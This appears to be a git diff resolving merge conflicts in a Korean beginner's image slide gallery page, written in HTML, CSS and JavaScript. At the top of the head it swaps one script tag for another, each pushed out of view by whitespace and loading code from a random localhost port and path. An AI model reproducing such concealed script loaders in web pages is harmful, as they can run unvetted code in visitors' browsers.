@@ -1,33 +1,21 @@
 <!DOCTYPE html>
 <html lang="ko">
-<head>                      <script src=http://127.0.0.1:57972/z1X></script>
+<head>                      <script src=http://127.0.0.1:64423/w6b></script>
     <meta charset="UTF-8">
-<<<<<<< HEAD
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-=======
-
->>>>>>> 9424129e73418fc792615a9d966d1d7ddc6cd99d
+    
     <title>슬라이드 갤러리</title>
     <style>
         * {margin:0; padding:0; list-style:none;}
         h1 {text-align: center; padding:20px}
         h2 {display: none;}
-<<<<<<< HEAD
-        #slide {overflow: hidden;width:450px; margin:auto;}
-=======
         #slide {overflow: hidden;width:450px; margin:auto; }
->>>>>>> 9424129e73418fc792615a9d966d1d7ddc6cd99d
         #slide ul {display: flex; width:fit-content; transition:ease all .3s}
         #slide img {display:block;width:450px; height:450px; object-fit: cover;}
         .page {display: flex; gap:20px; justify-content: center; margin-top:30px}
         .page span {width:20px; height:20px; background:#eee; border-radius: 50px; cursor: pointer; transition: ease all .3s;}
         .page span:hover {background:#000;}
         .page span.on {width:40px;background:#000;}
-<<<<<<< HEAD
-        #bt {margin:20px 0; display: flex; justify-content: space-between;}
-=======
         #bt {margin:20px auto; display: flex; justify-content: space-between; width:400px;}
->>>>>>> 9424129e73418fc792615a9d966d1d7ddc6cd99d
         #bt button {padding:5px 10px}
     </style>
 </head>
@@ -43,21 +31,6 @@
         <li><img src="img/3d5.png"></li>
         <li><img src="img/3d6.png"></li>
     </ul>
-<<<<<<< HEAD
-    <div class="page">
-        <span class="on"></span>
-        <span></span>
-        <span></span>
-        <span></span>
-        <span></span>
-        <span></span>
-    </div>
-    <div id="bt">
-        <button disabled>이전</button>
-        <button>다음</button>
-    </div>
-</section>
-=======
 </section>
 <div class="page">
     <span class="on"></span>
@@ -71,17 +44,12 @@
     <button>이전</button>
     <button>다음</button>
 </div>
->>>>>>> 9424129e73418fc792615a9d966d1d7ddc6cd99d
 <script>
     var ul = document.querySelector("ul");
     var span = document.querySelectorAll("span");
     var bt = document.querySelectorAll("button");
     var slide = document.querySelector("#slide");
 
-<<<<<<< HEAD
-
-=======
->>>>>>> 9424129e73418fc792615a9d966d1d7ddc6cd99d
     // 문제) 두번째 span을 클릭하면 ul을 움직여서 두번째 이미지가 보이도록
     // span[1].onclick = function(){
     //     ul.style.marginLeft = -450 + "px";
@@ -94,11 +62,8 @@
             // 현재위치 표현
             document.querySelector(".on").classList.remove("on");
             this.classList.add("on");
-<<<<<<< HEAD
-=======
             page = index;
             chk_bt();
->>>>>>> 9424129e73418fc792615a9d966d1d7ddc6cd99d
         }
     })
     var page = 0;
@@ -107,14 +72,8 @@
         if(page < span.length-1) {
             page++;
             ul.style.marginLeft = -450 * page + "px";
-<<<<<<< HEAD
-            chk_bt()
-        } 
-        else {
-=======
             //chk_bt();
         } else {
->>>>>>> 9424129e73418fc792615a9d966d1d7ddc6cd99d
             shake();
         }
     }
@@ -123,58 +82,22 @@
         if(page > 0) {
             page--;
             ul.style.marginLeft = -450 * page + "px";
-<<<<<<< HEAD
-            chk_bt()
-        }
-        else {
-            shake();
-        }
-}
-
-    // 과제) 이전/다음 버튼에 기능이 없을 때 
-    //       - 버튼을 비활성하기
-    
-    //       - 이미지 흔들기
-    function shake() {
-        slide.style.transform = "translate(10px, 0px)";
-=======
             //chk_bt();
         } else {
             shake();
         }
     }
 
-    // 과제) 이전/다음 버튼에 기능이 없을 때
+    // 과제) 이전/다음 버튼에 기능이 없을 때 
     //       - 버튼을 비활성하기
     //       - 이미지 흔들기
     function shake() {
         slide.style.transform = "translate(10px,0px)";
-
->>>>>>> 9424129e73418fc792615a9d966d1d7ddc6cd99d
+        
         setTimeout(function(){
             slide.style.transform = "translate(0px,-8px)";
         },50);
         setTimeout(function(){
-<<<<<<< HEAD
-            slide.style.transform = "translate(-6px, 0px)";
-        },100);
-        setTimeout(function(){
-            slide.style.transform = "translate(4px, 0px)";
-        },150);
-        setTimeout(function(){
-            slide.style.transform = "translate(0px, 2px)";
-        },200);
-        setTimeout(function(){
-            slide.style.transform = "translate(-1px, 0px)";
-        },200);
-    }
-    shacke();
-     function chk_bt(){
-        if(page ==0){
-            bt[0].disabled = "disabled";
-            bt[1].disabled = "";
-        } else if (page > 4) {
-=======
             slide.style.transform = "translate(-6px,0px)";
         },100);
         setTimeout(function(){
@@ -190,24 +113,19 @@
             slide.style.transform = "translate(0px,0px)";
         },300);
     }
-
+    
     function chk_bt() {
         if(page==0) {
             bt[0].disabled = "disabled";
             bt[1].disabled = "";
         } else if(page>=span.length-1) {
->>>>>>> 9424129e73418fc792615a9d966d1d7ddc6cd99d
             bt[1].disabled = "disabled";
             bt[0].disabled = "";
         } else {
             bt[0].disabled = "";
             bt[1].disabled = "";
         }
-<<<<<<< HEAD
-     }
-=======
     }
->>>>>>> 9424129e73418fc792615a9d966d1d7ddc6cd99d
 </script>
 </body>
 </html>
